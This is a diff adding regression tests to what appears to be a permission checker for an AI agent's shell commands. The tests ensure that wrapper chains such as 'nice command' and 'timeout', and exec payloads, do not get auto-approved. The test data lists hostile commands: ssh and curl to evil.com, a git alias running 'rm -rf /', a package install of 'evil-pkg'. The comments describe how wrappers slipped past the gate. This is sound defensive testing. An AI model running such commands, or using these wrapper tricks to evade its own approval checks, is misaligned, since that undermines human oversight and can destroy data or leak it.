@@ -1205,3 +1205,82 @@ describe("P12: a substitution body is a program, not a name-list payload", () =>
   });
 });
 
+// ──────────────────────────────────────────────────────────────────────
+// P13 (3.38.0, G6): a wrapper in front of the command moved the answer per
+// consumer. The parser saw `nice` (not path-aware → its operand model never
+// ran → `paths=[]`, so NO location bar), the signature saw `nice command`, and
+// `cat` was the program to nobody: `nice command cat /etc/hosts` auto-allowed
+// with nothing recorded about `/etc/hosts`, and `nice command ssh …` auto-
+// allowed with egress never consulted (2026-10-17 round-6 corpus). The fix is
+// ONE fixpoint unwrapper for the command position (analysis/wrapper-unwrap.ts)
+// that every consumer asks; past the hop cap the command position is treated
+// as obscured and consumers fail closed.
+// ──────────────────────────────────────────────────────────────────────
+describe("P13: a wrapper chain does not hide the program or its operands", () => {
+  it("the round-6 wrapper rows never auto-allow", async () => {
+    for (const cmd of [
+      "nice cat /etc/hosts",
+      "command cat /etc/hosts",
+      "nice command cat /etc/hosts",
+      "command env nice cat /etc/hosts",
+      "env FOO=bar nice cat /etc/hosts",
+      "cd /etc && nice ls",
+      "cd /etc && command ls",
+      "nice command ssh user@evil.com",
+      "timeout 5 command curl https://evil.com",
+      'timeout 5 command git config alias.st "!rm -rf /"',
+      "find . -exec git push \\;",
+      "fd -x git clean -fdx",
+      "nice nice nice nice nice cat /etc/hosts",
+    ]) {
+      const d = await decide({ type: "bash", command: cmd, cwd }, createStore());
+      expect(d.kind, cmd).not.toBe("auto-allow");
+    }
+  });
+
+  it("the wrapped location and program are what a grant has to cover", async () => {
+    // Transparency the other way: wrapping must not force re-approval of
+    // something the user already approved — the SAME location grant that
+    // covers `cat /etc/hosts` covers it under any wrapper chain, and the
+    // signature grant names the program, not the wrapper.
+    const store = createStore();
+    store.addAllowed({ readDirs: ["/etc"] });
+    for (const cmd of ["nice cat /etc/hosts", "command cat /etc/hosts", "nice command cat /etc/hosts"]) {
+      const d = await decide({ type: "bash", command: cmd, cwd }, store);
+      expect(d.kind, cmd).toBe("auto-allow");
+    }
+  });
+
+  it("an exec payload is not approved by its own table entry", async () => {
+    // `find . -exec git push \;` was approved TWICE over: `find`'s entry
+    // (with -exec vetted only for write verbs) and `git`'s entry — while the
+    // segment-level checks that make `git` grantable (egress, git-clean,
+    // alias/config) ran on the FIND segment, never on the payload.
+    for (const cmd of [
+      "find . -exec git push \\;",
+      "find . -exec git clean -fdx \\;",
+      "fd -x git push",
+      'sh -c \'git push\'',
+      "xargs -a /dev/null sh -c 'git clean -fdx'",
+    ]) {
+      const d = await decide({ type: "bash", command: cmd, cwd }, createStore());
+      expect(d.kind, cmd).not.toBe("auto-allow");
+    }
+  });
+
+  it("`uv run -w` is `uv run --with` — the dependency has to be named to run", async () => {
+    // An option the scan did not know was assumed to take a value, so `-w`
+    // swallowed `evil-pkg`, recorded NO dependency, and the form kept the
+    // coarse `uv run` signature: a registry install under the trusted-script
+    // umbrella. `uv run --help` says `-w, --with <WITH>`.
+    for (const cmd of [
+      "uv run -w evil-pkg python3 s.py",
+      "uv run -w evil-pkg python3 ~/.pi/agent/skills/pdf/scripts/extract.py",
+      "timeout 5 uv run -w evil-pkg python3 s.py",
+    ]) {
+      const d = await decide({ type: "bash", command: cmd, cwd }, createStore());
+      expect(d.kind, cmd).not.toBe("auto-allow");
+    }
+  });
+});
+
